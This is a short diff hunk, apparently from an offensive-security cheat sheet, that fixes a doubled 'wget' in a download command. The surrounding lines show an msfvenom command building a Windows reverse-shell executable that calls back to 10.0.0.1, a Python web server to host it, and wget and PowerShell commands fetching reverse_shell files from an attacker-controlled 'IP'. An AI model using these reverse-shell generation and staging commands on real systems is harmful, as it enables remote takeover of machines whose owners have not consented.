@@ -198,7 +198,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=1234 -f exe -o re
 sudo python -m http.server 80
 ```
 ```bash
-$ wget wget http://IP/reverse_shell.elf
+$ wget http://IP/reverse_shell.elf
 ```
 ```powershell
 PS> Invoke-WebRequest -Uri http://IP/reverse_shell.exe -OutFile reverse_shell.exe
